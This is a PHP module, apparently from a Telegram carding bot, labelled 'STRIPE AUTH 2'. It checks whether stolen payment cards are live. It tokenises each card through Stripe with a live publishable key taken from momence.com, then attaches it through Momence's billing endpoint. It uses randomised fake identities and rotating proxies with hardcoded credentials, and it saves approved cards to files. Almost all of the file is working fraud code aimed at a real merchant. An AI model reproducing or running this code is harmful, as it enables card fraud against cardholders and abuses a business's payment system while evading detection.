<?php

#----------------------------------------------------------------------#
#   GATE: STRIPE AUTH 2 					              		              	   #
#   SITE: https://momence.com/billing/				                         #
#----------------------------------------------------------------------#
$gate = "STRIPE AUTH 2";


if ((strpos($message, "/au") === 0) || (strpos($message, "!au") === 0)){
    sendMessage($chatId, "Gate is Down for Sometime..!!%0APlease ask Owner To update the gate @SWDQYL", $message_id);
    exit;

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Gates/functions/usefun.php";
//include "./Gates/functions/flagsgen.php";


$lista = substr($message, 3);
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }
  
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
//if (strlen($ano) == 2) $ano = "20$ano";

$lista = "$cc|$mes|$ano|$cvv";


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
//$bank = getStr($bindata,'"bank": {"name": "', '"')));
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];


  
//=================== [Proxys Section] ==================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)) { $ip = "Live! ✅"; }
if (empty($ip1)) { $ip = "Dead! ❌"; }

  
//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][postal_code]='.$zip.'&guid=23b8744c-9e16-45a8-ae43-d5a0de2c54a0809da8&muid=e3cd84f2-683a-4d22-b545-409686884665a67a12&sid=e1dff680-4845-43d3-951a-7d06b29d8c94c4f9ab&pasted_fields=number&payment_user_agent=stripe.js%2F4d6ab93de%3B+stripe-js-v3%2F4d6ab93de&time_on_page=36'.rand(111,999).'&key=pk_live_RoPa2iuvwBbqEISUd2LYTmKF');
$res1 = curl_exec($ch);
curl_close($ch);
$msg1 = trim(strip_tags(getStr($res1,'"message": "','"')));

  
  if (strpos($res1, "error")){
    sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐈𝐧𝐥𝐢𝐧𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$msg1.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘</a>%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
	return;
}
  
  

//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.momence.com/billing/HostAddCard');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.momence.com';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'content-type: application/json;charset=UTF-8';
//$headers[] = 'cookie: intercom-id-gjf5tpix=afb453da-7054-4cc5-8ccc-1a27e7b9c251; _fbp=fb.1.1642640092082.1528570841; ribbon.connect.sid=s%3ANKXzz3jPhP8inMrCuXZn-nvJvPvy-0D4.zco5%2FkeevgrVce98SSKJGvMzQlJnsCDMUT%2FC%2BTtETdQ; __stripe_mid=e3cd84f2-683a-4d22-b545-409686884665a67a12; __stripe_sid=e1dff680-4845-43d3-951a-7d06b29d8c94c4f9ab; intercom-session-gjf5tpix=ZGMwYXl4YkhSSkxXLzlrejFrcTNhOXZRejNOY2dicGx5TE5pcE4vY0N2QTdBelVUVlpiTEpZNVF3V2dBbXkzdy0tUG5EWnorOTBlWkNDOVBOYnFjWDlXdz09--0e5f123a19cd6f54cf84e8677c55bf60714b4a18';
$headers[] = 'origin: https://momence.com';
$headers[] = 'referer: https://momence.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"hostId":11'.rand(100,299).',"paymentMethod":'.$res1.'}');
$res2 = curl_exec($ch);

  
$msg = trim(strip_tags(getStr($res2,'"message":"','"')));
$err = trim(strip_tags(getStr($res2,'"status":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
  curl_close($ch);


//==================[Responses]======================//

if((strpos($res2, 'Success')) || (strpos($res2, "Successed")) || (strpos($res2, "success")) ){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>SUCCEED</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
	file_put_contents('save/cvv2.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif ((strpos($res2, 'insufficient_funds')) || (strpos($res2, "Your card has insufficient funds."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your card has Insufficient funds.</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
  	file_put_contents('save/insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif ((strpos($res2, 'incorrect_cvc')) || (strpos($res2, "Your card's security code is incorrect."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<i><b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your cards security code is incorrect.</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
  	file_put_contents('save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}

elseif(strpos($res2,  '"error"')) {
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$msg.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

elseif (strpos($res2, '-1')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>(-1) Error_Reporting.</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}

else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$msg.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}



curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>